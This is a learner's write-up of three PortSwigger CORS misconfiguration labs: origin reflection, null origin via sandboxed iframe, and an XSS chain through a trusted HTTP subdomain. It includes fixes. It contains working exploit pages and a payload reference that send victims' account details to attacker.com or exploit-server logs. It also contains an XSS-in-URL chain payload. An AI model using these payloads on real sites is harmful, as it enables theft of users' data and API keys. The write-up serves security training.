# Day 26 — CORS Misconfigurations
**Date:** May 9, 2026
**Platform:** PortSwigger Web Security Academy
**Labs Completed:** 3 Labs
**Status:** All Solved ✅

---

## 1. What We Did Today — Overview

Today was entirely focused on CORS — Cross-Origin Resource Sharing misconfigurations. We completed all 3 PortSwigger labs covering every major CORS misconfiguration pattern: basic origin reflection where the server trusts any origin it receives, null origin whitelisting exploited via sandboxed iframes, and trusted insecure subdomain CORS chained with reflected XSS. Every lab required building a working exploit page on the exploit server and delivering it to a victim — simulating a real cross-origin data theft attack end to end.

---

## 2. The Foundation — Why CORS Misconfigurations Exist

### Root Cause — Start With Same-Origin Policy

To understand CORS misconfigurations you first need to understand why CORS exists. And to understand why CORS exists you need to understand the Same-Origin Policy.

**Same-Origin Policy (SOP):**

Browsers enforce a fundamental security rule: a webpage loaded from one origin cannot read the response of a request made to a different origin.

An **origin** is defined as the combination of three things:
```
Protocol + Domain + Port

https://example.com:443   → one origin
http://example.com:443    → different origin (different protocol)
https://evil.com:443      → different origin (different domain)
https://example.com:8080  → different origin (different port)
```

**Why SOP exists:**

Without SOP — any malicious website you visit could use JavaScript to make requests to your bank, read your balance, and exfiltrate it. Your browser automatically attaches session cookies to every request. The malicious site would receive the bank's response and read all your data. SOP prevents this — when `evil.com` makes a request to `bank.com`, the browser sends the request but **blocks the JavaScript from reading the response.**

**Why CORS exists — the legitimate problem:**

SOP is strict. But modern web applications legitimately need cross-origin requests. A frontend at `app.example.com` needs to call an API at `api.example.com` — different origins, SOP would block it. CORS lets servers **selectively relax SOP** for trusted origins by adding response headers:
```
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
```
The browser sees these headers and allows the JavaScript to read the response.

**The misconfiguration:**

Instead of trusting specific known origins — developers implement CORS incorrectly:

1. **Blind origin reflection:** Whatever origin the request claims — the server echoes it back trusted. `evil.com` sends `Origin: https://evil.com` → server responds `Access-Control-Allow-Origin: https://evil.com`
2. **Null origin whitelisting:** Developer whitelists `null` thinking it is safe — sandboxed iframes send `Origin: null` and are attacker-controlled
3. **Trusting insecure subdomains:** Any subdomain with XSS becomes a CORS bypass vector — XSS on a trusted subdomain makes trusted cross-origin requests

### Real World Analogy

Imagine a secure office building where only employees with a valid badge can enter and access files. The building installs an intercom — when someone presses it and says "I am from the head office" the door automatically unlocks. No badge check. Just trust whatever the visitor claims.

An attacker presses the intercom, says "I am from the head office" — door unlocks, they access everything. Same-Origin Policy is the badge system. CORS origin reflection is the intercom that trusts whatever origin is claimed.

### Three Conditions for CORS Misconfiguration to Be Exploitable

1. The server reflects the attacker's origin in `Access-Control-Allow-Origin` — or whitelists `null` or a compromisable subdomain
2. The server includes `Access-Control-Allow-Credentials: true` — meaning cookies are sent with cross-origin requests
3. The victim has an active authenticated session — so the request carries their session cookie and returns their private data

All three must be true. Without credentials — the attacker gets an unauthenticated response. Without origin reflection — the browser blocks the read.

### What CORS Misconfiguration Can and Cannot Do

**Can do:**
- Steal authenticated user data from APIs — account details, API keys, private messages
- Perform authenticated actions on behalf of the victim if the API uses cookies
- Exfiltrate sensitive data cross-origin using the victim's own session

**Cannot do:**
- Write data to the victim's browser storage directly
- Work without victim interaction — victim must visit the attacker's page
- Steal data if `Access-Control-Allow-Credentials` is false — attacker gets no session data
- Work if the server uses a strict origin whitelist with no reflection

### How the Attack Works — The Full Mechanism

```
Step 1: Victim visits attacker's page at evil.com
Step 2: evil.com JavaScript makes cross-origin request to victim-site.com/api/account
        Browser automatically attaches victim's session cookie
Step 3: victim-site.com responds:
        Access-Control-Allow-Origin: https://evil.com
        Access-Control-Allow-Credentials: true
Step 4: Browser allows evil.com JavaScript to read the response
        (server said it trusts evil.com)
Step 5: JavaScript reads victim's account data
        Sends it to attacker: fetch('https://attacker.com/log?key=' + data)
Step 6: Attacker receives victim's private data
```

### The Exploit JavaScript Pattern

```javascript
var req = new XMLHttpRequest();
req.onload = function() {
    // Exfiltrate response to attacker's server
    location = 'https://attacker.com/log?key=' + btoa(this.responseText);
};
req.open('GET', 'https://target-site.com/accountDetails', true);
req.withCredentials = true;   // Critical — sends victim's session cookies
req.send();
```

`withCredentials = true` is critical — without it the request is unauthenticated and returns nothing useful.

### CORS vs CSRF — Know the Difference

| Aspect | CORS Misconfiguration | CSRF |
|--------|-----------------------|------|
| Goal | **Read** cross-origin data | **Perform** cross-origin actions |
| What it steals | Response data — API keys, account info | Nothing — performs unauthorized actions |
| Requires withCredentials | Yes — to get authenticated response | No — browser sends cookies automatically |
| Protected by CSRF token | No — reads responses, does not submit forms | Yes — CSRF tokens prevent forged submissions |
| Impact | Data exfiltration | Unauthorized state changes |

### How to Test for CORS — The Methodology

For every API endpoint returning sensitive data:

**Step 1:** Add Origin header in Burp Repeater:
```
Origin: https://evil.com
```

**Step 2:** Check response for:
```
Access-Control-Allow-Origin: https://evil.com     ← reflected — vulnerable
Access-Control-Allow-Credentials: true            ← cookies included — exploitable
```

**Step 3:** Also try:
```
Origin: null
Origin: https://subdomain.target.com
Origin: https://target.com.evil.com
Origin: https://notreallytarget.com
```

**Step 4:** If origin reflected AND credentials true → build exploit page and confirm data theft

### Real World Example — Coinbase 2018

A researcher found that Coinbase's API reflected arbitrary origins in `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true`. Any victim who visited the malicious page had their account balance, transaction history, and personal details exfiltrated. Payout: **$3,500**. CORS misconfigurations on financial APIs have paid up to **$10,000+** depending on data sensitivity.

---

## 3. Lab Walkthroughs

---

### Lab 1 — CORS Vulnerability With Basic Origin Reflection ✅

**Vulnerability type:** CORS — server reflects any origin in Access-Control-Allow-Origin combined with credentials allowed

**What this lab proves:** A server that blindly echoes the Origin header back as trusted — combined with Allow-Credentials — lets any attacker page steal authenticated user data cross-origin.

**How it was solved:**

Logged in as `wiener:peter`. Found the `/accountDetails` API endpoint in Burp HTTP History — this endpoint returns the user's API key. Sent to Repeater. Added Origin header:
```
Origin: https://evil.com
```

**Response confirmed misconfiguration:**
```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

Built exploit page on the exploit server:
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('GET', 'https://TARGET-LAB-ID.web-security-academy.net/accountDetails', true);
req.withCredentials = true;
req.send();

function reqListener() {
    location = '/log?key=' + btoa(this.responseText);
}
</script>
```

Stored and delivered to victim. Access log showed victim's account details base64 encoded. Decoded and extracted API key.

**Victim's API key:**
```
2VAR3MvsrYfcThUQ9l8Ky8L1ckHMpIOv
```

**Why it worked:**

The server read the `Origin` header from every incoming request and blindly echoed it back in `Access-Control-Allow-Origin`. With `Access-Control-Allow-Credentials: true` — the browser attached the victim's session cookie to the cross-origin request and allowed our exploit JavaScript to read the authenticated response. The victim's API key was returned in the response and exfiltrated to our log.

**The vulnerable server-side pattern:**
```javascript
// Vulnerable — reflects any origin
app.use((req, res, next) => {
    const origin = req.headers['origin'];
    if (origin) {
        res.setHeader('Access-Control-Allow-Origin', origin);      // ← reflects anything
        res.setHeader('Access-Control-Allow-Credentials', 'true');
    }
    next();
});

// Fixed — explicit whitelist only
const allowedOrigins = ['https://trusted-app.example.com'];
app.use((req, res, next) => {
    const origin = req.headers['origin'];
    if (allowedOrigins.includes(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Credentials', 'true');
    }
    next();
});
```

---

### Lab 2 — CORS Vulnerability With Trusted Null Origin ✅

**Vulnerability type:** CORS — null origin whitelisted, exploitable via sandboxed iframe

**What this lab proves:** Whitelisting `null` as a trusted origin is dangerous because sandboxed iframes send `Origin: null` — and attackers control sandboxed iframes.

**How it was solved:**

Logged in as `wiener:peter`. Found `/accountDetails` in HTTP History. Sent to Repeater. Added:
```
Origin: null
```

**Response confirmed misconfiguration:**
```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

The server explicitly trusted the null origin. Built exploit using a sandboxed iframe — the `sandbox` attribute strips the iframe's origin, causing it to send `Origin: null`:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
    srcdoc="<script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('GET', 'https://TARGET-LAB-ID.web-security-academy.net/accountDetails', true);
        req.withCredentials = true;
        req.send();
        function reqListener() {
            location = 'https://EXPLOIT-SERVER-ID.exploit-server.net/log?key=' + btoa(this.responseText);
        }
    </script>">
</iframe>
```

Stored and delivered to victim. Decoded base64 from access log — extracted API key.

**Victim's API key:**
```
oirYouuDoAgwZRpB3fYLEAVCu7aPf8bC
```

**Why null origin is generated:**
The browser sends `Origin: null` in specific situations:
- Requests from sandboxed iframes (`<iframe sandbox>`) — used tonight
- Requests from `data:` URLs
- Requests from `file://` URLs
- Some cross-origin redirect scenarios

Developers sometimes whitelist `null` thinking it means "local" or "internal" — it does not. Sandboxed iframes are fully attacker-controllable content that generates null origin requests.

**Why the sandboxed iframe was necessary:**

Without the `sandbox` attribute — an iframe inherits the origin of its source URL. With `sandbox` — the origin is stripped and becomes `null`. The server trusted `null` — so our sandboxed iframe's requests were accepted as trusted.

```
Normal iframe at evil.com:          Origin: https://evil.com  → server rejects
Sandboxed iframe at evil.com:       Origin: null              → server accepts (misconfiguration)
```

---

### Lab 3 — CORS Vulnerability With Trusted Insecure Protocols ✅

**Vulnerability type:** CORS — HTTP subdomains trusted combined with reflected XSS on trusted subdomain

**What this lab proves:** A CORS whitelist that trusts HTTP subdomains is only as strong as the weakest subdomain. XSS on any trusted subdomain turns into a CORS bypass — the XSS runs in a trusted origin context and makes credentialed cross-origin requests the server accepts.

**How it was solved:**

Logged in as `wiener:peter`. Found `/accountDetails` in HTTP History. Tested with subdomain origin:
```
Origin: http://stock.0aa5002b0426fd3583e8a5f2005e00d7.web-security-academy.net
```

**Response confirmed misconfiguration:**
```
Access-Control-Allow-Origin: http://stock.0aa5002b0426fd3583e8a5f2005e00d7.web-security-academy.net
Access-Control-Allow-Credentials: true
```

The server trusted HTTP subdomains. Found reflected XSS on the stock subdomain — the `productId` parameter reflected input unsanitized into the page. Confirmed XSS with `<script>alert(1)</script>`.

Chained XSS on the trusted subdomain with CORS — built exploit that redirected the victim to the stock subdomain with an XSS payload. The XSS ran in the trusted subdomain's context and made a credentialed CORS request to the main site.

**Working exploit script:**
```html
<script>
document.location = "http://stock.0aa5002b0426fd3583e8a5f2005e00d7.web-security-academy.net/?productId=1<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('GET','https://0aa5002b0426fd3583e8a5f2005e00d7.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='https://exploit-0a5600390446fdcb836aa46f011c001c.exploit-server.net/exploit/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

Key URL encoding in the payload:
- `%2b` — URL encoded `+` for string concatenation in the XSS payload
- `%3c/script>` — URL encoded closing script tag to avoid breaking the outer script

Stored and delivered to victim. Access log showed victim's account details. Extracted API key.

**Victim's API key:**
```
dkVGwPIADd0g0JebHHdT8y4yB9XbpiQS
```

**The three-vulnerability chain:**

```
Vulnerability 1: CORS trusts HTTP subdomains
        ↓
Vulnerability 2: Reflected XSS on trusted HTTP subdomain (productId parameter)
        ↓
Vulnerability 3: Sensitive data in /accountDetails API response
        ↓
Chain: XSS runs in trusted subdomain context
       → Makes credentialed CORS request to main site
       → Server accepts (trusted subdomain origin)
       → Victim's API key returned and exfiltrated
```

**Why HTTP subdomains are dangerous to trust:**

HTTPS subdomains: encrypted, harder to intercept or manipulate at network level
HTTP subdomains: unencrypted, vulnerable to:
- Network interception (attacker on same network can inject content)
- XSS vulnerabilities (even low-impact XSS becomes critical when combined with CORS)
- Any compromise of the HTTP subdomain becomes a CORS bypass vector

A CORS whitelist should only ever include HTTPS origins with strong security postures.

---

## 4. Vulnerable Source Code — The Patterns Behind All Labs

**Lab 1 — Blind reflection (most dangerous, most common):**
```javascript
// Vulnerable
const origin = req.headers['origin'];
res.setHeader('Access-Control-Allow-Origin', origin);      // Always reflects
res.setHeader('Access-Control-Allow-Credentials', 'true');
```

**Lab 2 — Null origin whitelisted:**
```javascript
// Vulnerable
const allowedOrigins = ['https://trusted.com', 'null'];   // null is dangerous
if (allowedOrigins.includes(origin)) { /* grant access */ }
```

**Lab 3 — Insecure subdomain pattern:**
```javascript
// Vulnerable — trusts all subdomains including HTTP
const allowedPattern = /^https?:\/\/.*\.example\.com$/;   // http:// allowed
if (allowedPattern.test(origin)) { /* grant access */ }
```

**The correct implementation:**
```javascript
// Secure — explicit HTTPS-only whitelist, no null, no wildcards with credentials
const allowedOrigins = [
    'https://app.example.com',
    'https://dashboard.example.com'
    // Never: 'null'
    // Never: http:// origins
    // Never: wildcard subdomains
];

app.use((req, res, next) => {
    const origin = req.headers['origin'];
    if (origin && allowedOrigins.includes(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Credentials', 'true');
    }
    // No CORS headers set for untrusted origins
    // Browser enforces SOP automatically
    next();
});
```

**Why the fix works:** Only explicitly whitelisted HTTPS origins get trust headers. `evil.com` sends its origin — gets no CORS headers back — browser enforces SOP and blocks the read. The server never needed to actively block evil.com — it simply never granted it trust.

**The wildcard trap:**
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```
Browsers refuse to honor this combination. Wildcard with credentials is explicitly disallowed by the CORS specification. Wildcard alone is only dangerous for public APIs returning unauthenticated data.

---

## 5. Chain Thinking — CORS to Full Account Takeover

```
Today's vulnerability: CORS origin reflection (Lab 1)
        ↓
Combines with: XSS on trusted subdomain (Lab 3)
        ↓
Further combines with: Sensitive API key in /accountDetails response
        ↓
Combined impact: Cross-origin theft of API key → authenticated account access
        ↓
Severity upgrade: Medium CORS + Low XSS + Medium info disclosure = Critical account takeover
```

**The full attack chain:**
```
Step 1: Discover CORS misconfiguration
        GET /accountDetails HTTP/2
        Origin: https://evil.com
        →
        Access-Control-Allow-Origin: https://evil.com
        Access-Control-Allow-Credentials: true

Step 2: Find XSS on trusted HTTP subdomain
        http://stock.target.com/?productId=<script>alert(1)</script>
        → Alert fires — confirmed XSS

Step 3: Build chained exploit
        Exploit page redirects victim to:
        http://stock.target.com/?productId=XSS-PAYLOAD

        XSS payload (running in trusted subdomain context):
        var req = new XMLHttpRequest();
        req.open('GET', 'https://target.com/accountDetails', true);
        req.withCredentials = true;
        req.onload = function() {
            fetch('https://attacker.com/log?key=' + this.responseText);
        };
        req.send();

Step 4: Victim visits exploit page
        Redirected to trusted subdomain with XSS
        XSS executes in stock.target.com context
        CORS request made — server trusts this origin
        Victim's API key returned to attacker

Step 5: Attacker uses API key
        Authenticates as victim
        Full account access — data, actions, transactions
```

**Real world scenario:** A fintech API reflects all origins and trusts HTTP subdomains. The marketing subdomain at `http://promo.fintech.com` has reflected XSS on a campaign parameter. Attacker chains XSS with CORS — stealing API keys and session tokens from every victim who clicks the exploit link. With the API key — attacker accesses bank balances and initiates transfers. Combined bug bounty value: **$5,000–$20,000**.

---

## 6. Real World Context

| Vulnerability | Real World Impact | Payout Range |
|---------------|------------------|--------------|
| Basic origin reflection + credentials | Steal any authenticated user's sensitive data | $1,000 – $5,000 |
| Null origin whitelist | Same impact — exploit via sandboxed iframe | $500 – $3,000 |
| Insecure subdomain trust + XSS | Critical chain — steal data from any victim | $3,000 – $15,000 |
| CORS on financial API (any type) | Account balance, transaction history theft | $5,000 – $20,000+ |

CORS misconfigurations on APIs handling financial data or authentication tokens are consistently rated Critical and pay at the top end of bug bounty programs.

---

## 7. The Fix — Defense in Depth

**Layer 1 — Explicit HTTPS-only origin whitelist:**
Maintain a hardcoded list of trusted origins. Only HTTPS origins. No wildcards. No null. Check the incoming Origin header against this exact list — never reflect it back blindly.

**Layer 2 — Never whitelist null:**
The null origin provides no security value as a whitelist entry. Any feature requiring null origin should be redesigned. Remove null from all CORS configurations.

**Layer 3 — Only trust subdomains with strong security posture:**
If subdomains must be trusted — only trust HTTPS subdomains. Audit every trusted subdomain for XSS and other vulnerabilities. A weak subdomain is a CORS bypass.

**Layer 4 — Separate public and private APIs:**
Public APIs returning non-sensitive data can use `Access-Control-Allow-Origin: *` safely — but must never include `Access-Control-Allow-Credentials: true`. Private authenticated APIs must use strict whitelists.

**Layer 5 — Validate on the server, not the client:**
CORS headers are instructions to the browser — a security control at the browser level. Server-side authorization must not rely on CORS alone. Sensitive endpoints must validate session tokens server-side regardless of Origin.

---

## 8. Key Concepts Summary

| Concept | Definition |
|---------|-----------|
| Same-Origin Policy | Browser rule — JavaScript cannot read responses from different origins |
| Origin | Protocol + Domain + Port combination — all three must match for same origin |
| CORS | Server headers that selectively relax SOP for trusted origins |
| Access-Control-Allow-Origin | Response header — tells browser which origins can read the response |
| Access-Control-Allow-Credentials | Response header — tells browser to include cookies in cross-origin requests |
| Origin reflection | Server echoes back whatever Origin header the request contains — most dangerous misconfiguration |
| Null origin | Special origin sent by sandboxed iframes, data: URLs, file: URLs |
| withCredentials | XMLHttpRequest property — sends cookies with cross-origin requests |
| Sandboxed iframe | iframe with sandbox attribute — strips origin, sends Origin: null |
| CORS vs CSRF | CORS reads data cross-origin — CSRF performs actions cross-origin |
| Trusted subdomain chain | XSS on trusted subdomain + CORS = cross-origin data theft from main site |

---

## 9. Payloads and Commands Reference

**Testing CORS in Burp Repeater:**
```
Add to any authenticated API request:
Origin: https://evil.com
Origin: null
Origin: http://subdomain.target.com

Look for in response:
Access-Control-Allow-Origin: [your origin]
Access-Control-Allow-Credentials: true
```

**Basic exploit page (origin reflection):**
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('GET', 'https://TARGET.web-security-academy.net/accountDetails', true);
req.withCredentials = true;
req.send();
function reqListener() {
    location = '/log?key=' + btoa(this.responseText);
}
</script>
```

**Null origin exploit (sandboxed iframe):**
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
    srcdoc="<script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('GET', 'https://TARGET.web-security-academy.net/accountDetails', true);
        req.withCredentials = true;
        req.send();
        function reqListener() {
            location = 'https://EXPLOIT-SERVER/log?key=' + btoa(this.responseText);
        }
    </script>">
</iframe>
```

**XSS + CORS chain (trusted insecure subdomain):**
```html
<script>
document.location = "http://stock.TARGET.web-security-academy.net/?productId=1<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('GET','https://TARGET.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='https://EXPLOIT-SERVER/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

Key URL encoding:
```
%2b = + (string concatenation operator)
%3c = < (closing script tag opening bracket)
```

---

## 10. Foundation Checklist

Answer these from memory — not from these notes:

1. **What is the Same-Origin Policy?** What does it prevent and why does it exist?
2. **What is CORS?** Why was it created — what legitimate problem does it solve?
3. **What three conditions must all be true for a CORS misconfiguration to be exploitable?**
4. **Why is null origin dangerous to whitelist?** How does a sandboxed iframe generate it?
5. **What is the difference between CORS misconfiguration and CSRF?** One reads data, one does what?
6. **How does Lab 3's chain work?** Walk through the three vulnerabilities and how they connect step by step.

---
